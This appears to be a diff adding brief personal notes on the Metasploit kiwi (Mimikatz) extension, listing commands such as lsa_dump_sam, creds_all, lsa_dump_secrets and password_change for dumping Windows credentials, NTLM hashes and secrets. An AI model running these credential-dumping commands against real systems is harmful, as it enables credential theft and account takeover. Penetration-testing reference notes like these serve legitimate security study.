@@ -1,0 +1,10 @@
+comes with metasploit to start:
+load kiwi 
+
+  ? #help
+  lsa_dump_sam #dumps the lsa sam
+  creds_all #retrieves all credentials
+    windows versions 8.1 do not store clear text passwords
+   lsa_dump_sam #dumps ntlm hash for each user
+   lsa_dump_secrets #dumps secrets
+   password_change #changes password/hash of a  user
